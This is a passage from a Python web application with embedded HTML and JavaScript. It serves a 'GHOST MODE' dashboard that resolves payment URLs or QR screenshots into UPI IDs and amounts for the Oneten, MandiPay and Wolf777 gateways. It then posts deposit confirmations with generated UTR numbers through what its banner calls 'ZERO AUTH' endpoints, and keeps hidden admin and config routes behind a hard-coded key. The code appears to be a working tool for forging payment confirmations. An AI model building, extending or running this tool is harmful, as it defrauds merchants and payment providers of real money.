.st{padding:12px}.st-v{font-size:20px}.st-l{font-size:9px}
.brand-icon{width:36px;height:36px;font-size:15px;border-radius:10px}
.brand h1{font-size:16px}
.brand small{font-size:9px}
.tabs{flex-direction:row}.tab{padding:8px 10px;font-size:11px}
.btn{padding:10px 16px;font-size:11px;width:100%;text-align:center}
.fg input,.fg select{padding:10px;font-size:11px}
.fg label{font-size:9px}
.clk{display:none}
.badge,.badge-a,.badge-g,.badge-y,.badge-r,.badge-bl{font-size:9px;padding:2px 7px}
.log-e{flex-wrap:wrap;gap:6px;padding:8px 10px}
.log-d{font-size:10px}
.vpa{font-size:9px}
.method-tag{font-size:8px;padding:2px 6px}
}
</style>
</head>
<body>
<div class="shell">
<header>
<div class="brand"><div><h1>Payments</h1></div></div>
<div class="hdr-r"><div class="clk" id="clock"></div><div class="pill"><div class="dot"></div><span id="liveLabel">ACTIVE</span></div></div>
</header>

<!-- Tabs -->
<div class="tabs">
<div class="tab tab-oneten active" onclick="switchTab('oneten')"><span class="tdot"></span>Oneten <span class="mono" style="font-size:10px;color:var(--d);margin-left:4px">(567 merchants)</span></div>
<div class="tab tab-mandipay" onclick="switchTab('mandipay')"><span class="tdot"></span>MandiPay <span class="mono" style="font-size:10px;color:var(--d);margin-left:4px">(13 merchants)</span></div>
<div class="tab tab-wolf777" onclick="switchTab('wolf777')"><span class="tdot"></span>🐺 Wolf777 <span class="mono" style="font-size:10px;color:var(--d);margin-left:4px">(5 routes)</span></div>
</div>

<!-- ═══ URL PASTE BAR ═══ -->
<div class="cd" style="margin-bottom:20px;border:1px solid rgba(16,185,129,.2);background:linear-gradient(135deg,rgba(16,185,129,.04),rgba(139,92,246,.04))">
<div class="cd-b" style="padding:18px 20px">
<div style="font-size:13px;font-weight:700;margin-bottom:10px">🔗 Paste Deposit URL</div>
<div class="fr" style="margin-bottom:0"><div class="fg" style="flex:3"><input id="url-input" placeholder="Paste payment URL here..." style="font-size:13px;padding:12px 14px"></div><div class="fg" id="vpa-box" style="flex:1.2;display:none"><input id="vpa-input" placeholder="UPI ID (VPA)" style="font-size:13px;padding:12px 14px"></div><div class="fg" id="amt-box" style="flex:1;display:none"><input id="amt-input" type="number" placeholder="₹ Amount" style="font-size:13px;padding:12px 14px"></div><button class="btn btn-g" id="confirm-btn" onclick="confirmURL()" style="white-space:nowrap">⚡ Confirm</button></div>
<div id="qr-drop" style="margin-top:10px;border:2px dashed rgba(16,185,129,.3);border-radius:10px;padding:12px;text-align:center;font-size:11px;color:var(--d);cursor:pointer;display:none" ondragover="event.preventDefault();this.style.borderColor='var(--g)'" ondragleave="this.style.borderColor='rgba(16,185,129,.3)'" ondrop="handleQRDrop(event)" onclick="document.getElementById('qr-file').click()">📸 Drop screenshot here or click to upload — decodes QR locally (ghost 👻)<input type="file" id="qr-file" accept="image/*" style="display:none" onchange="handleQRFile(this)"></div>
<div id="url-preview" style="margin-top:10px;display:none;padding:10px 14px;background:var(--s);border-radius:8px;font-size:11px;color:var(--d)"></div>
</div></div>

<!-- ═══ ONETEN PANEL ═══ -->
<div class="gw-panel active" id="panel-oneten">
<div class="stats">
<div class="st grn"><div class="st-l">Confirmed</div><div class="st-v" id="ot-conf">0</div><div class="st-s">SUCCESS_AUTO</div></div>
<div class="st blu"><div class="st-l">Amount</div><div class="st-v" id="ot-amt">₹0</div><div class="st-s">Total confirmed</div></div>
<div class="st red"><div class="st-l">Failed</div><div class="st-v" id="ot-fail">0</div><div class="st-s">Errors</div></div>
</div>
<div class="cd"><div class="cd-h"><div class="cd-t">📜 Activity Log</div><div class="fx"><span class="badge badge-a" id="ot-lc">0</span><button class="btn btn-o btn-s" onclick="clearLog('oneten')">Clear</button></div></div><div id="ot-log" style="max-height:350px;overflow-y:auto"><div class="empty">No activity</div></div></div>
</div>

<!-- ═══ MANDIPAY PANEL ═══ -->
<div class="gw-panel" id="panel-mandipay">
<div class="stats">
<div class="st grn"><div class="st-l">Confirmed</div><div class="st-v" id="mp-conf">0</div><div class="st-s">SUCCESS_AUTO</div></div>
<div class="st blu"><div class="st-l">Amount</div><div class="st-v" id="mp-amt">₹0</div><div class="st-s">Total confirmed</div></div>
<div class="st red"><div class="st-l">Failed</div><div class="st-v" id="mp-fail">0</div><div class="st-s">Errors</div></div>
</div>
<div class="cd"><div class="cd-h"><div class="cd-t">📜 Activity Log</div><div class="fx"><span class="badge badge-a" id="mp-lc">0</span><button class="btn btn-o btn-s" onclick="clearLog('mandipay')">Clear</button></div></div><div id="mp-log" style="max-height:350px;overflow-y:auto"><div class="empty">No activity</div></div></div>
</div>

<!-- ═══ WOLF777 PANEL ═══ -->
<div class="gw-panel" id="panel-wolf777">
<div class="stats">
<div class="st" style="background:linear-gradient(135deg,rgba(245,158,11,.12),rgba(217,119,6,.06));border-color:rgba(245,158,11,.2)"><div class="st-l">Confirmed</div><div class="st-v" id="wf-conf" style="color:#f59e0b">0</div><div class="st-s">SUCCESS_AUTO</div></div>
<div class="st" style="background:linear-gradient(135deg,rgba(245,158,11,.08),rgba(217,119,6,.04));border-color:rgba(245,158,11,.15)"><div class="st-l">Amount</div><div class="st-v" id="wf-amt" style="color:#fbbf24">₹0</div><div class="st-s">Total confirmed</div></div>
<div class="st red"><div class="st-l">Failed</div><div class="st-v" id="wf-fail">0</div><div class="st-s">Errors</div></div>
</div>
<div class="cd" style="border:1px solid rgba(245,158,11,.15)">
<div style="padding:12px 16px;border-bottom:1px solid var(--b);display:flex;gap:6px;flex-wrap:wrap">
<span class="badge" style="background:rgba(139,92,246,.15);color:#a78bfa;font-size:10px">🔀 OneTen</span>
<span class="badge" style="background:rgba(16,185,129,.15);color:#6ee7b7;font-size:10px">🔀 MandiPay</span>
<span class="badge" style="background:rgba(245,158,11,.15);color:#fbbf24;font-size:10px">🐝 HivePay</span>
<span class="badge" style="background:rgba(239,68,68,.15);color:#fca5a5;font-size:10px">⚡ 51-GW</span>
<span class="badge" style="background:rgba(59,130,246,.15);color:#93c5fd;font-size:10px">🔗 BeePay</span>
</div>
<div class="cd-h"><div class="cd-t">📜 Wolf777 Activity Log</div><div class="fx"><span class="badge badge-a" id="wf-lc">0</span><button class="btn btn-o btn-s" onclick="clearLog('wolf777')">Clear</button></div></div><div id="wf-log" style="max-height:350px;overflow-y:auto"><div class="empty">No Wolf777 activity — paste any Wolf777 deposit URL to start</div></div></div>
</div>

<!-- ═══ HEALTH STATUS ═══ -->
<div class="cd" style="margin-top:20px;border:1px solid rgba(139,92,246,.15)">
<div class="cd-h"><div class="cd-t">🛡️ Endpoint Health</div><button class="btn btn-o btn-s" onclick="runHealth()">Check Now</button></div>
<div class="cd-b" style="padding:14px"><div id="health-status" style="font-size:11px;color:var(--d)">Click "Check Now" to verify access</div></div>
</div>
</div>
<div class="toast-c" id="toasts"></div>
<script>
let activeGw='oneten';
function switchTab(gw){activeGw=gw;document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));document.querySelector('.tab-'+gw).classList.add('active');document.querySelectorAll('.gw-panel').forEach(p=>p.classList.remove('active'));document.getElementById('panel-'+gw).classList.add('active')}
function toast(m,t='ok'){const c=document.getElementById('toasts'),e=document.createElement('div');e.className='toast '+t;e.textContent=m;c.appendChild(e);setTimeout(()=>e.remove(),3500)}
function uc(){document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-IN',{hour12:false})}setInterval(uc,1000);uc();
async function fetchAll(){try{
for(const [gw,p] of[['oneten','ot'],['mandipay','mp'],['wolf777','wf']]){
const r=await fetch('/api/state?gw='+gw);const d=await r.json();
document.getElementById(p+'-conf').textContent=d.confirmed;
document.getElementById(p+'-amt').textContent='₹'+d.total_amount.toLocaleString('en-IN');
document.getElementById(p+'-fail').textContent=d.failed;
document.getElementById(p+'-lc').textContent=d.log.length;
const lg=document.getElementById(p+'-log');
if(!d.log.length){lg.innerHTML='<div class="empty">No activity</div>'}
else{lg.innerHTML=d.log.map(l=>`<div class="log-e"><span class="log-t">${l.time}</span><span>${l.status==='OK'?'✅':l.status==='FAIL'?'❌':'ℹ️'}</span><div class="log-d"><b>${l.action}</b> ${l.d1} ₹${l.d2} UTR:<span class="mono">${l.utr||'—'}</span> ${l.msg||''}</div><span class="badge ${l.status==='OK'?'badge-g':'badge-r'}">${l.status}</span></div>`).join('')}
}}catch(e){}};setInterval(fetchAll,3000);fetchAll();
let _resolved=null;
document.getElementById('url-input').addEventListener('input',function(){
  const v=this.value.trim();
  document.getElementById('amt-box').style.display='none';
  document.getElementById('vpa-box').style.display='none';
  document.getElementById('qr-drop').style.display='none';
  document.getElementById('amt-input').value='';
  document.getElementById('vpa-input').value='';
  _resolved=null;
});
async function confirmURL(){
  const url=document.getElementById('url-input').value.trim();
  if(!url||!url.startsWith('http'))return toast('Paste a valid URL','err');
  const pv=document.getElementById('url-preview');
  pv.style.display='block';pv.innerHTML='<span style="color:var(--y)">⏳ Resolving...</span>';
  try{
    const r=await fetch('/api/resolve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.ok){
      let amt=d.amount;
      let vpa=d.vpa||document.getElementById('vpa-input').value.trim();
      if(d.needs_amount){
        document.getElementById('vpa-box').style.display='block';
        document.getElementById('qr-drop').style.display='block';
        if(d.amount && d.amount>0){
          document.getElementById('amt-input').value=d.amount;
        }else{
          document.getElementById('amt-box').style.display='block';
        }
        amt=parseFloat(document.getElementById('amt-input').value)||d.amount;
        let vpaVal=document.getElementById('vpa-input').value.trim();
        if(!amt||amt<=0){pv.innerHTML='<span style="color:var(--y)">⚠ Enter amount and press Confirm again</span>';toast('Enter the deposit amount','err');document.getElementById('amt-input').focus();return}
        if(!vpa && !vpaVal){pv.innerHTML='<span style="color:var(--y)">⚠ ₹'+amt+' detected. Enter VPA and press Confirm</span>';toast('Enter the UPI ID','err');document.getElementById('vpa-input').focus();return}
        if(vpaVal) vpa=vpaVal;
      }
      const brandLabel=d.brand==='wolf777'?'🐺 WOLF777 → '+d.gw.toUpperCase():d.gw.toUpperCase();
      pv.innerHTML=`<span style="color:${d.brand==='wolf777'?'#f59e0b':'var(--g)'}">${d.brand==='wolf777'?'🐺':'✅'} ${brandLabel}</span> VPA: <b class="mono" style="font-size:10px">${vpa}</b> | Amount: <b>₹${amt}</b>`;
      const cr=await fetch('/api/confirm',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gw:d.gw,vpa:vpa,amount:amt,request_id:d.request_id||'',brand:d.brand||''})});
      const cd=await cr.json();
      if(cd.ok){
        let vBadge='';
        if(cd.verified===true)vBadge=' <span class="badge badge-g" style="margin-left:4px">✅ VERIFIED</span>';
        else if(cd.verified===false)vBadge=' <span class="badge badge-r" style="margin-left:4px">❌ ORPHAN</span>';
        else if(cd.verified===null)vBadge=' <span class="badge" style="margin-left:4px;background:rgba(245,158,11,.15);color:#f59e0b;border:1px solid rgba(245,158,11,.3)">⚠ UNVERIFIED</span>';
        toast('✅ SUCCESS_AUTO — ₹'+amt+(d.brand==='wolf777'?' 🐺':'')+(cd.verify_msg?' | '+cd.verify_msg:''));
        pv.innerHTML+=` <span class="badge badge-g" style="margin-left:8px">CONFIRMED</span>`+vBadge;
        document.getElementById('url-input').value='';document.getElementById('amt-input').value='';document.getElementById('vpa-input').value='';document.getElementById('amt-box').style.display='none';document.getElementById('vpa-box').style.display='none';if(d.brand==='wolf777')switchTab('wolf777')
      }
      else{toast('⚠ '+(cd.error||'Confirm failed'),'err');pv.innerHTML+=` <span class="badge badge-r" style="margin-left:8px">FAILED</span>`}
    }else{
      pv.innerHTML=`<span style="color:var(--r)">⚠ Could not extract payment details.</span> ${d.error||''}`;
      toast('Could not resolve URL','err');
    }
  }catch(e){pv.innerHTML=`<span style="color:var(--r)">❌ ${e}</span>`;toast('Error','err')}
  fetchAll();
}
function clearLog(gw){fetch('/api/clear-log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gw})});fetchAll()}
async function processQR(file){
  const reader=new FileReader();
  reader.onload=async function(e){
    const pv=document.getElementById('url-preview');
    pv.style.display='block';pv.innerHTML='<span style="color:var(--y)">📸 Decoding QR locally...</span>';
    try{
      const r=await fetch('/api/qr-decode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:e.target.result})});
      const d=await r.json();
      if(d.ok){
        document.getElementById('vpa-input').value=d.vpa;
        if(d.amount)document.getElementById('amt-input').value=d.amount;
        pv.innerHTML=`<span style="color:var(--g)">👻 VPA: <b>${d.vpa}</b></span>${d.amount?' | Amount: <b>₹'+d.amount+'</b>':''}`;
        toast('👻 VPA extracted locally');
      }else{
        pv.innerHTML='<span style="color:var(--r)">⚠ Could not decode QR. Try a clearer screenshot.</span>';
        toast('QR decode failed','err');
      }
    }catch(err){pv.innerHTML='<span style="color:var(--r)">❌ '+err+'</span>'}
  };
  reader.readAsDataURL(file);
}
function handleQRDrop(e){e.preventDefault();const f=e.dataTransfer.files[0];if(f&&f.type.startsWith('image/'))processQR(f)}
function handleQRFile(input){if(input.files[0])processQR(input.files[0])}
async function runHealth(){
  const el=document.getElementById('health-status');
  el.innerHTML='<span style="color:var(--y)">⏳ Checking endpoints...</span>';
  try{
    const r=await fetch('/api/health',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
    const d=await r.json();
    let html='';
    for(const[gw,domains]of Object.entries(d)){
      html+=`<div style="margin-bottom:8px"><b style="color:var(--p)">${gw.toUpperCase()}</b></div>`;
      for(const dom of domains){
        const icon=dom.alive?'🟢':'🔴';
        const color=dom.alive?'var(--g)':'var(--r)';
        const label=dom.alive?'ALIVE':'DOWN';
        html+=`<div style="margin-left:12px;margin-bottom:4px">${icon} <span class="mono" style="font-size:10px">${dom.domain}</span> <span class="badge ${dom.alive?'badge-g':'badge-r'}" style="font-size:9px">${label}</span> <span style="font-size:9px;color:var(--d)">${dom.msg}</span></div>`;
      }
    }
    el.innerHTML=html;
    const allAlive=Object.values(d).flat().every(x=>x.alive);
    toast(allAlive?'🛡️ All endpoints alive':'⚠️ Some endpoints DOWN',allAlive?'ok':'err');
  }catch(e){el.innerHTML='<span style="color:var(--r)">❌ '+e+'</span>'}
}
</script></body></html>"""

# ─── Secret Config Page ───
CONFIG_HTML = r"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Config</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#050510;color:#e4e4f8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{width:360px;max-width:100%}
.card{background:#0f0f24;border:1px solid rgba(100,100,200,.12);border-radius:16px;padding:28px 24px;margin-bottom:16px}
h2{font-size:15px;font-weight:700;color:#a78bfa;margin-bottom:20px}
.row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(100,100,200,.06)}
.row:last-child{border:none}
.lbl{font-size:12px;color:#7a7a9e}
.val{font-family:'JetBrains Mono',monospace;font-size:20px;font-weight:700}
.val.g{color:#10b981}.val.b{color:#3b82f6}.val.p{color:#a78bfa}
input[type=number]{width:70px;padding:8px 10px;background:#141430;border:1px solid rgba(100,100,200,.15);border-radius:8px;color:#e4e4f8;font-family:'JetBrains Mono',monospace;font-size:16px;text-align:center;outline:none}
input:focus{border-color:#8b5cf6}
.btn{width:100%;padding:12px;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s;margin-top:8px}
.btn-p{background:linear-gradient(135deg,#8b5cf6,#7c3aed);color:#fff}
.btn-r{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.2)}
.btn:hover{transform:translateY(-1px)}
.msg{text-align:center;font-size:11px;color:#10b981;margin-top:10px;min-height:16px}
</style></head><body>
<div class="c">
<div class="card">
<h2>⚙ Device Config</h2>
<div class="row"><span class="lbl">Active Devices</span><span class="val g" id="active">—</span></div>
<div class="row"><span class="lbl">Max Allowed</span><input type="number" id="maxInput" min="1" max="50" value="3"></div>
<button class="btn btn-p" onclick="setMax()">Update Limit</button>
<button class="btn btn-r" onclick="clearAll()">Clear All Sessions</button>
<div class="msg" id="msg"></div>
</div>
</div>
<script>
const K='369369';
async function load(){
  const r=await fetch('/api/x/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:K})});
  const d=await r.json();
  document.getElementById('active').textContent=d.active_devices;
  document.getElementById('maxInput').value=d.max_sessions;
}
async function setMax(){
  const v=parseInt(document.getElementById('maxInput').value);
  const r=await fetch('/api/x/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:K,max:v})});
  const d=await r.json();
  document.getElementById('msg').textContent='✅ Limit set to '+d.max_sessions;
  load();setTimeout(()=>document.getElementById('msg').textContent='',2000);
}
async function clearAll(){
  if(!confirm('Clear all sessions?'))return;
  const r=await fetch('/api/x/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:K,clear:true})});
  const d=await r.json();
  document.getElementById('msg').textContent='✅ All sessions cleared';
  load();setTimeout(()=>document.getElementById('msg').textContent='',2000);
}
load();setInterval(load,5000);
</script></body></html>"""

# ─── Server ───
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self,*a):pass
    def resp(self,c,d,ct="application/json",cookie=None):
        self.send_response(c);self.send_header("Content-Type",ct);self.send_header("Access-Control-Allow-Origin","*")
        if cookie:self.send_header("Set-Cookie",cookie)
        self.end_headers()
        self.wfile.write(d if isinstance(d,bytes) else d.encode())
    def get_token(self):
        cookies = SimpleCookie(self.headers.get("Cookie",""))
        return cookies.get("sid").value if "sid" in cookies else None
    def require_auth(self):
        token = self.get_token()
        if not token or not get_session(token):
            return None
        return token
    def do_GET(self):
        p=urlparse(self.path)
        token = self.require_auth()
        if p.path in ["/","/index.html"]:
            if not token:
                self.resp(200,LOGIN_HTML,"text/html")
            else:
                self.resp(200,HTML,"text/html")
        elif p.path=="/x369":
            self.resp(200,ADMIN_HTML,"text/html")
        elif p.path=="/x369c":
            self.resp(200,CONFIG_HTML,"text/html")
        elif p.path=="/api/admin/sessions":
            qs=parse_qs(p.query)
            key=qs.get("key",[""])[0]
            if key!="369369":self.resp(401,'{"error":"denied"}');return
            with sessions_lock:
                result=[]
                for sid,s in sessions.items():
                    total_conf=sum(s["state"][gw]["confirmed"] for gw in GATEWAYS)
                    total_amt=sum(s["state"][gw]["total_amount"] for gw in GATEWAYS)
                    total_fail=sum(s["state"][gw]["failed"] for gw in GATEWAYS)
                    all_logs=[]
                    for gw in GATEWAYS:
                        for l in s["state"][gw]["log"]:
                            all_logs.append({**l,"gw":gw})
                    all_logs.sort(key=lambda x:x["time"],reverse=True)
                    result.append({"id":sid[:6]+"..","created":s["created"],"confirmed":total_conf,
                        "amount":total_amt,"failed":total_fail,"logs":all_logs[:30]})
            self.resp(200,json.dumps({"sessions":result,"total_sessions":len(result)}))
        elif p.path=="/api/state":
            if not token:self.resp(401,'{"error":"auth"}');return
            gw=parse_qs(p.query).get("gw",["oneten"])[0]
            st = get_session_state(token, gw)
            if st:self.resp(200,json.dumps(st))
            else:self.resp(401,'{"error":"session expired"}')
        else:self.resp(404,'{"error":"nf"}')
    def do_POST(self):
        ln=int(self.headers.get("Content-Length",0))
        body=json.loads(self.rfile.read(ln).decode()) if ln>0 else {}
        p=urlparse(self.path).path
        if p=="/api/login":
            pw=body.get("password","")
            if pw==AUTH_PASSWORD:
                with sessions_lock:
                    if len(sessions) >= CONFIG["max_sessions"]:
                        self.resp(200,json.dumps({"ok":False,"error":f"Max {CONFIG['max_sessions']} devices reached. Try later."}))
                        return
                token=new_session()
                self.resp(200,json.dumps({"ok":True}),cookie=f"sid={token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400")
            else:
                self.resp(200,json.dumps({"ok":False,"error":"Invalid password"}))
            return
        # ─── SECRET CONFIG ENDPOINT ───
        # Usage: POST /api/x/config with {"key":"369369","max":10} to set limit
        #        POST /api/x/config with {"key":"369369","clear":true} to clear all sessions
        #        POST /api/x/config with {"key":"369369"} to view current status
        if p=="/api/x/config":
            key=body.get("key","")
            if key!=AUTH_PASSWORD:
                self.resp(403,json.dumps({"ok":False,"error":"wrong key"}));return
            if "max" in body:
                CONFIG["max_sessions"]=int(body["max"])
            if body.get("clear"):
                with sessions_lock:
                    sessions.clear()
            with sessions_lock:
                active=len(sessions)
            self.resp(200,json.dumps({"ok":True,"max_sessions":CONFIG["max_sessions"],"active_devices":active}))
            return
        token = self.require_auth()
        if not token:self.resp(401,json.dumps({"ok":False,"error":"Not authenticated"}));return
        if p=="/api/qr-decode":
            img_data = body.get("image","")
            if ',' in img_data: img_data = img_data.split(',',1)[1]
            try:
                img_bytes = base64.b64decode(img_data)
                qr = decode_qr_from_image(img_bytes)
                self.resp(200,json.dumps({"ok":bool(qr["vpa"]),"vpa":qr["vpa"],"amount":qr["amount"]}))
            except Exception as e:
                self.resp(200,json.dumps({"ok":False,"error":str(e)[:80]}))
        elif p=="/api/resolve":
            url=body.get("url","")
            result=resolve_payment_url(url)
            self.resp(200,json.dumps(result))
        elif p=="/api/health":
            hc=health_check()
            self.resp(200,json.dumps(hc))
        elif p=="/api/confirm":
            gw=body.get("gw","oneten")
            brand=body.get("brand","")
            utr=body.get("utr") or gen_utr()
            amt=body.get("amount",0)
            if float(amt) > 16000:
                log_gw = "wolf777" if brand=="wolf777" else gw
                add_log(token,log_gw,"BLOCKED","",amt,"","FAIL",f"Amount ₹{amt} exceeds ₹16,000 limit")
                self.resp(200,json.dumps({"ok":False,"error":f"Amount ₹{amt} exceeds ₹16,000 limit"}))
                return
            vpa=body.get("vpa","")
            request_id=body.get("request_id","")
            code,resp=confirm_ghost(gw,vpa,utr,amt,request_id=request_id if request_id else None)
            label=vpa
            ok=code==200
            if ok and isinstance(resp,dict) and resp.get('success') is False: ok=False
            # Extract verification info
            verified = None
            verify_msg = ""
            if isinstance(resp, dict):
                verified = resp.get("_verified")
                verify_msg = resp.get("_verify_msg", "")
            sess = get_session(token)
            if sess:
                # Update underlying gateway stats
                st = sess["state"][gw]
                if ok:st["confirmed"]+=1;st["total_amount"]+=float(amt)
                else:st["failed"]+=1
                # Also update Wolf777 tab if branded
                if brand=="wolf777" and "wolf777" in sess["state"]:
                    wst = sess["state"]["wolf777"]
                    if ok:wst["confirmed"]+=1;wst["total_amount"]+=float(amt)
                    else:wst["failed"]+=1
            log_gw = "wolf777" if brand=="wolf777" else gw
            wolf_label = f"🐺 {gw.upper()}: {label}" if brand=="wolf777" else label
            log_detail = verify_msg[:60] if verify_msg else (str(resp)[:60] if isinstance(resp,dict) else str(resp)[:60])
            add_log(token,log_gw,"CONFIRM",wolf_label,amt,utr,"OK" if ok else "FAIL",log_detail)
            self.resp(200,json.dumps({"ok":ok,"code":code,"resp":str(resp)[:120],"verified":verified,"verify_msg":verify_msg}))
        elif p=="/api/clear-log":
            gw=body.get("gw","oneten")
            sess = get_session(token)
            if sess: sess["state"][gw]["log"]=[]
            self.resp(200,'{"ok":true}')
        else:self.resp(404,'{"error":"nf"}')
    def do_OPTIONS(self):
        self.send_response(200);self.send_header("Access-Control-Allow-Origin","*");self.send_header("Access-Control-Allow-Methods","GET,POST");self.send_header("Access-Control-Allow-Headers","Content-Type");self.end_headers()

if __name__=="__main__":
    print(f"""
╔═══════════════════════════════════════════════════════════╗
║  GHOST MODE — statement/manual                            ║
║  ═════════════════════════════                            ║
║                                                           ║
║  ┌─────────────┬────────────────┬────────────────────┐    ║
║  │ Gateway     │ Method         │ Auth               │    ║
║  ├─────────────┼────────────────┼────────────────────┤    ║
║  │ Oneten      │ statement/     │ ZERO AUTH 👻       │    ║
║  │ (567 merch) │ manual         │                    │    ║
║  ├─────────────┼────────────────┼────────────────────┤    ║
║  │ MandiPay    │ statement/     │ ZERO AUTH 👻       │    ║
║  │ (13 merch)  │ manual         │                    │    ║
║  └─────────────┴────────────────┴────────────────────┘    ║
║                                                           ║
║  Dashboard: http://localhost:{PORT}                          ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
""")
    srv=http.server.HTTPServer(("0.0.0.0",PORT),H)
    print(f"  ✅ Running on http://localhost:{PORT}")
    print(f"  Ctrl+C to stop\n")
    try:srv.serve_forever()
    except KeyboardInterrupt:
        print("\n  Shutting down...");srv.shutdown()
